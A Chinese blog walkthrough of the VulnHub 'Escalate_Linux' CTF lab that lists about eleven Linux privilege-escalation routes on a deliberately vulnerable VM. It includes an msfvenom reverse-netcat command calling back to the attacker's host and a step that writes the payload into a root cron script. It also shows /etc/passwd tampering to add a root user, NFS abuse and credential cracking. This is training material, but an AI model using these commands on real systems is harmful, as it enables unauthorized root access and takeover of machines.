> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vUjFqGBeZ3G7GeFPt746qQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **44** 篇文章，本公众号会每日分享攻防渗透技术给大家。

  

  

靶机地址：https://www.vulnhub.com/entry/escalate_linux-1,323/

靶机难度：初级（CTF）

靶机发布日期：2019 年 6 月 30 日

靶机描述：

Escalate_Linux - 一种有意开发的易受攻击的 Linux 虚拟机。该计算机的主要重点是学习 Linux Post Exploitation（特权升级）技术。

“Escalate_Linux” Linux 易受攻击的虚拟机包含与之不同的功能。

12 种以上特权升级方式

垂直特权升级

横向特权升级

多级特权升级

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/l2qh5n17wuEuJltJyFgUGg4hkO5ybibIn8u7VKKQ4zviaZ49ZT3So3U3degUs7HQMpID69mffFmPNCDHIpG2ic6OQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HiarQWtC4eOPPgtt13moKqTe5EZiazaVo72gqUuoryt5UoE2luIpLG3omibDyeF6NkJBgzYmR7HmDBSua509n2GPg/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z2XnKqrmJG9u5PDObTUvWxxyWX04gTEKI5icYCTOuTYAs5TiagFGdibFibQ/640?wx_fmt=png)  

看介绍说有 12 种左右的方法提权？？？？

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZCRYjs2c0olltm20l16T1zmZxXAk4ibVYPoJj6KkL1PrSsuZxDXmHIyQ/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.182.142

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZeRnzJq2wnjicjd5RLZytbfnRY7H4T92yXJxicVYe34DFGg5nzE8vJfGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZnHyzoq0B8A71z5eaOD0Wrw6azhnbr1uwoprwDuQ0p9tLMveg9iazBuw/640?wx_fmt=png)

开放了挺多端口... 一个一个往下渗透吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Zaiav6oHeCIxVdfKRmkmAVHsXXH5ZgBjCxSAc3Vb4HRmV603AqdtIB5g/640?wx_fmt=png)

默认的 apache 页面... 针对 apache，我直接爆破 php... 应该是存在的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z5XciboOz3yGiaUeNG1tCibnJ8MRnYLpxwE39RvZDkz57a9tUO7Cd26rvA/640?wx_fmt=png)

```
dirb http://192.168.182.142 -X .php
```

找到了 shell.php，进去看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZudSsBWM5ib1g6nrhsT4czo1f4ia9ORqNicyJMEemgXSAddqtSacyJOX4g/640?wx_fmt=png)

可以执行 cmd 命令？？试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZDoicNwmQNyELWwCo9YKMBEnB9e5Tj4jUl5FBB2WCMvP0OHorT8u2KyA/640?wx_fmt=png)

果然可以... 权限 user6... 这里有 3 种方法可以提权到 user6... 我直接最简单的了，看我前面章节也知道复现过很多这种场景...（当然有更多方法请老哥指导）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Zib5ian2DImvvxotCZyhrOiagr1r23JBBQ8ia3nbFhPXTwM4CRticprZYr4w/640?wx_fmt=png)

利用了 MSF 创建了反向 shell，然后将 shell 进行 URL 编码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Zu2h6E4cb16oFucrTbicqic7SWBz0c6RIibfBQKCF8VjFPvFb7micccfTlw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZuueJGS0GfiaCnCZxwMw2gkCibJQOA9sicosCONhjlIdJE1qtbmDwz0T2g/640?wx_fmt=png)

在 web 链接输入，即可提权...

进来后，更快的发现漏洞枚举用户... 我使用 LinEnum 工具... 上传它

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z9H66MdnMI47qLQ5sJBCMJdwXWF8Vqld0p6dw01qIyicjSBATAP57ORw/640?wx_fmt=png)

到 tmp 目录成功上传了... 执行

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZW5tW5Gsgj8QupZobkvB5J3qKribQ2ZjDJIjILibPiavFcvwBKShKzHjqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z1VibfDtykhEpePVgNHmoj4ydD55dj3YEhBPaEjOm2XnxVFZaITawWyA/640?wx_fmt=png)

可以看到存在八个用户......

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z4FwH2J9ibQrpyTYcLgpFLB5fzx9ukGd7zicqRQwFpUzWRlaFVvkO3r9g/640?wx_fmt=png)

在 crontab 中，每 5 分钟使用 root 特权运行 autoscript.sh 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z3jWqKicibzzAmfM6VcdvtzG1WW1GNkSM4cvTpRKPeo9dWc2BXQU4rq9A/640?wx_fmt=png)

看到 / etc/passwd 对用户也是可写的，还发现可以使用 root 特权运行 shell 和脚本文件，在其上启用了 SUID 位...

通过 LinEnum 工具把应该能发现的漏洞都体现出来了... 这边开始提权...

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://mmbiz.qpic.cn/mmbiz_png/HiarQWtC4eOPPgtt13moKqTe5EZiazaVo72gqUuoryt5UoE2luIpLG3omibDyeF6NkJBgzYmR7HmDBSua509n2GPg/640?wx_fmt=png)

二、提权

方法 1

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Zw05icLJol2Tsz44na653h0LhL7r6PcicGQHgHD5j18P6OG4eaZ2TMf7w/640?wx_fmt=png)

```
find / -perm -u=s -type f 2>/dev/null
```

user3 用户可执行 shell 提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZKpDHnHUE6pYbxLQStXzLQdHfhk5ahd0zeI8jia4OZeicYlrTc8phsicHA/640?wx_fmt=png)

使用 find 命令，可以确认，可以使用 root 特权执行位于 user3 主目录中的 shell 文件，成功提权 root...

方法 2

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

前面 LinEnum 工具发现可以使用 root 特权执行位于 user5 主目录中的脚本文件，使用 Path 变量利用方法，可以访问 / etc/shadow 文件...

学习关路径变量特权升级：

```
[链接](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZuCiceibrJKVrMU6WWTVK8ZleofVlmMGcicYJqr0pCfibxdSlrU6DyWC61w/640?wx_fmt=png)

可以看到我这边没成功... 该脚本执行的时候应该会以 root 身份执行，然后加载环境变量，执行 cat /etc/shadow 命令，这样的话我们就能够拿到 root 身份的密码值，然后使用 john 破解即可... 但是没成功，我检查下...

nmap 前面发现了 2049 端口 NFS 打开着，我通过 NFS 把 script 放到本地检查下...（NFS 前面章节也讲过）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZuUnYgMLTTeTLZkItUKUDdyTOuZgpUEiakVojIPkGZhzjfd8KAibgAMow/640?wx_fmt=png)

不必看输入错的字符... 尴尬... 是 ELF 64-bit 这边用 GDB 分析下... 我需要在 64 位 kali 上分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZJCnGJvicjvhH9wGUyEmcgI1JmlUib89G7iciccYIJZlhwgCBxUtmzrYaQg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZHpNFzLNic1y9ia964unxBc8dibKaS6Z88W9NHN1bhxIzmKTAZmiajZxO9A/640?wx_fmt=png)

分析了一圈... 发现二进制文件 script 是基于 ls 文件执行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZkmGqPpTibbQuiaX5rpAuwiaI96p0fibeuD4ia6YgmZPS3GNWvCKCHab5ywQ/640?wx_fmt=png)

可以看到本身文件脚本不执行任何操作的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZhwXhJWFB0d6JQDFcMUSkXWNazGoPEdNG9iam4w0lTF35VlXicvPX4hrw/640?wx_fmt=png)

只需要针对 ls 加载环境变量即可... 成功提权...

方法 3

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

在前面的截图中，有看到在 crontab 中，每 5 分钟使用 root 特权运行 autoscript.sh 文件...

借鉴方法 2，使用相同的脚本文件，可以借助 Path 变量方法更改所有用户的密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZrFtQRI7HfdYTyVZqCiavQtdISyhOBRAhz8nD75mwFl3fiafXTzje21MA/640?wx_fmt=png)

使用 echo 和 chpasswd 命令将现有密码替换为新密码 12345... 然后使用 su 命令切换到 user4 帐户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZdwUJUV2bnTLB0ia0bMDHOoaO6S55KaVBeibUZiagVoViapALic6gjCJZOkg/640?wx_fmt=png)

在桌面文件夹中看到文件 autoscript.sh....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZgqPguZVT6XF6uEq8ic77uIYEb1dRcPibdL5TI5nSVBcdFnrlTXb87N0g/640?wx_fmt=png)

```
msfvenom  -p  cmd/unix/reverse_netcat lhost=192.168.182.141  lport=8888  R
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z0mtnZn9zBUr1LoH1z3sNDDnD9JKECZKtIiaOn2PEDq1m1VYGKpKd6jw/640?wx_fmt=png)

```
echo "shellcode" > autoscript.sh
```

将代码复制到 autoscript.sh 文件后，执行该文件，并在 kali 上启动了 netcat 侦听器，等待 shell 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZlA8LibhEvPoH5SJ5dA8HnhkjYBlg4ebCyRahvq7ia0zVKFdib6iaia0WNgw/640?wx_fmt=png)

成功获得 root...

方法 4

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

使用与上述相同的方法将所有用户的密码更改为 12345，并在用户之间切换来检查更多漏洞，发现 user8 对 vi 编辑器具有 sudo 权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZVVxwQPiaiaTLVr6ozVL3DWGSos5rxvPPFBEKRGQv6vg3k8geZgNKE9pw/640?wx_fmt=png)

准备使用 sudo 打开 vi 编辑器，并插入 sh 命令...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZFtWjOicVeTfdTv5RqtCwzDahtcVtIicCn2U1YcWulYvV3Vr6n7Tws1kQ/640?wx_fmt=png)

输入:!sh，获得了 root shell...

方法 5

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

继续进行用户枚举，发现 user7 是 gid 为 0 的根组的成员...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZsBrGQibjzI1r8BhS3q0MgIlAdu4uw2ZScTuNkGNFxlVY7Ayic0AGOJlw/640?wx_fmt=png)

从 LinEnum 扫描中知道 / etc/passwd 文件对于用户是可写的，user7 可以编辑 / etc/passwd 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZticfKPJjKugbDVhz2wiaD2aPSGFG79L5pO20iat9udICuzMWlu4O8Jwmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z0Kl9UngkX5XTxgHpOwnEl72PaysfwyEpQorSGajVBaZbXfD5ibm0gZg/640?wx_fmt=png)

```
openssl passwd -1 -salt ignite dayu
```

在 kali 机器中复制了 / etc/passwd 文件的内容，并创建了一个具有 root 特权的名为 dayu 的新用户，并使用 openssl 为该用户生成了密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZfM5IGfhiccicB27eGVUMS0tHp1JRkic7jqoIbYyjEzdN34fbaJewcSYmA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZSx3K2WIGiaXKCS5dnSjoKApQqmOWibNK17DKWoJrT1dfRSmDApoHBlQg/640?wx_fmt=png)

使用 dayu 用户登录即可... 提权成功...

方法 6

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

前面也提过了 nmap 发现了 NFS 共享开放着

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZC7wnuTQPOkZK53QQuzOia27zZLyQzzDrBm9zpHJvYbl4tjy7JJMQfdg/640?wx_fmt=png)

通过 LinEnum 工具也发现了安装点的存在...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZHlIMjLLfcErVr33LWsWTnQE5kicv5GLiazlIyp3Y2qAriajUiaHibicicphSA/640?wx_fmt=png)

```
/home/user5 *(rw,no_root_squash)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZKsfianIQSSEiciblndHlCmTaTq3mNpzEqfqiaGiaKg3MANZeREic6CiaQmUpQ/640?wx_fmt=png)

将 user5 通过 NFS 共享到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z8nLQxuSF2QNjcEiceibSSnaBqaJoD9xuJr8hicplfZKRib67vzJGzq54iaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZDPFB9fY4MkZpBhJnf32xLOvexUMbWIbn92JwAiaoX7CMxuGiaflWOXYQ/640?wx_fmt=png)

创建一个 SUID，执行即可....

方法 7

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z3MQECV6nI6T9O35lLIWJ6msuKnUsZ5QPWZyUY6pJnoRBZgpO2747Uw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZFp65HIwCibCKz2NTfrV0SxsCsickQQaiciazuX8icGiavQOzaZkjov5ehR1Q/640?wx_fmt=png)

从 LinEnum 扫描中知道 mysql 可以利用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZPWsSwXDASOj77X1wTjczvLqRcVZpkxTMeeyvw5ibBPtZYibIEHHpicjkg/640?wx_fmt=png)

密码默认 root....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZDxu5qcr8wo42432bKfWhQQGrHhKWahhRk0Vp17ec4ic2xaWANgNuBQA/640?wx_fmt=png)

通过挖掘数据库发现了 mysql 用户，密码是

```
mysql@12345
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z8icsItkHUnIOcbhpHJS14MprSpFVgsHyxWx8eC3YNAPCtFzaDT00hUg/640?wx_fmt=png)

在数据库中看到了 user1~8 用户的密码... 继续找下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZAd8Fv5hG4GAtVaxDE8vibbp0iaesasdK9BbuRLU1ynIIzz0DqtHUnzLA/640?wx_fmt=png)

在 secret 文件中查看到了 root 密码...

方法 8

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z67mYiajQ2iawUMP9SsRSVRBd1DS4YawoL3fibMVlDIFyZnp4Yy8S9icTIQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Z3icN0pt3U0cLHEv8Qr0uA79w8WkiaJVoNia1LxTia54yfSZtVKf8o6fMtQ/640?wx_fmt=png)

提权成功....

方法 9

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8Zx48KHn75DaicUjpwegETZBYTKCYQWXUD6aSkrWK1C1A9KeNyibvMQFEQ/640?wx_fmt=png)

检查组权限时，发现在根组下找到 user4 和 user7... 意思是 user4 和 user7 可以修改 / etc/passwd 文件...

方法和方法 5 一样执行即可提权... 修改 passwd

方法 10

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP3J9v8uyzIqNTFFfPjiaW8ZdzsOIXC8WKJogvWpC8a6SqYiaxGKS6cAuw8o3Q3IicKgAnwSjYwuP5lw/640?wx_fmt=png)

在 / home/user3 下，发现了 script.sh 文件... 和方法 1 一样提权即可.....

方法 11

![](https://mmbiz.qpic.cn/mmbiz_png/7EQMr4U945rLwYeErsWD5zaHJCn4D1KHes5XGibasJicOSjM92OgBYUu7vmZ7B2CRyy4Snm6uAzSiaoTvazoMyMWA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/FlEB4lWebiag9yDkiamTUoQnYavdMPPib1rCAKrlU7yK72gCw3FJU8BwicSvbVa2qWjlMTKmBuG0XCclInCj1jtgPA/640?wx_fmt=png)

收集 / etc/shadow 文件，并使用 john 中自带密码库进行爆破即可... 思路其实就是和方法 2 的思路一样...

  

  

这里差不多了... 方法 12 应该是 user1 直接提权... 有些方法比较直接...

由于我们已经成功得到 root 权限，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/l2qh5n17wuEuJltJyFgUGg4hkO5ybibIn8u7VKKQ4zviaZ49ZT3So3U3degUs7HQMpID69mffFmPNCDHIpG2ic6OQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)